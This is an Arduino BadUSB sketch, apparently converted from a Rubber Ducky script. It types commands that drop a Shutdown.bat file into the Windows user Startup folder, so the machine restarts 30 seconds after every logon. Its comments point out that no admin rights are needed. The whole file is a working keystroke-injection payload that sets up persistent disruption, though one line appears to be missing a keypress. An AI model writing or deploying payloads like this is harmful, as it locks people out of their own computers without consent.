
/* Converted by LeonarDucky v1.0 */

#include <Keyboard.h>
void setup() {
int delayms = 500;
Keyboard.begin();
delay(3000);
// Open the command line. You don't need admin because you are only adding to the Users Startup Directory
delay(delayms);
Keyboard.press(KEY_ESC);
Keyboard.releaseAll(); 
delay(delayms);
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_ESC);
Keyboard.releaseAll();
delay(400);
Keyboard.print("cmd");
delay(delayms);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
delay(100);
// start making Shutdown.bat
Keyboard.print("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Shutdown.bat\"");
Keyboard.print("@echo off");
delay(delayms);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("shutdown /r /t 30");
// The shutdown command has many good options '/t' adds a Delay, and '/r' restarts
// '/s' will shut the computer down and '/l' (L) is to just logoff the user more options are available by running 'shutdown /?'
delay(delayms);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
delay(delayms);
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press('z');
Keyboard.releaseAll();
Keyboard.print("exit");
delay(delayms);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
}
void loop() {}